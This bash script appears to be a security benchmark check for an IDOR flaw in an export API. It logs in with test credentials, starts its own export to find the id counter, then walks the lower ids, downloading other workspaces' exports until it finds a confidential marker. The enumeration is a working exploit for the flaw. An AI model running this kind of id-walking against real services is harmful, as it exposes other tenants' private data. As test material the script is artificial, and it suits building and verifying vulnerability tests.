#!/usr/bin/env bash
# EXPORT-STATE-001 (CWE-639): export downloads only check ownership while the
# job is still running. An Acme user starts their own export to learn where the
# id counter is, then walks the older ids for finished exports of other workspaces.
set -uo pipefail
source "$(dirname "$0")/_lib.sh"
login user1@bench.local 'User123!'

MINE=$(curl -s -b "$JAR" -X POST "$TARGET/api/exports" | json_get id)         # 1. my own export
[ -n "$MINE" ] || { echo "could not start an export" >&2; exit 2; }
for _ in $(seq 1 25); do                                                       # 2. wait for it
  [ "$(curl -s -b "$JAR" "$TARGET/api/exports/$MINE" | json_get status)" = done ] && break
  sleep 0.2
done

HIT=1; id=1
while [ "$id" -lt "$MINE" ]; do                                                # 3. walk the older ids
  if curl -s -b "$JAR" "$TARGET/api/exports/$id/download" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'; then
    HIT=0; break
  fi
  id=$((id + 1))
done

curl -s -b "$JAR" -X DELETE "$TARGET/api/exports/$MINE" >/dev/null
exit $HIT
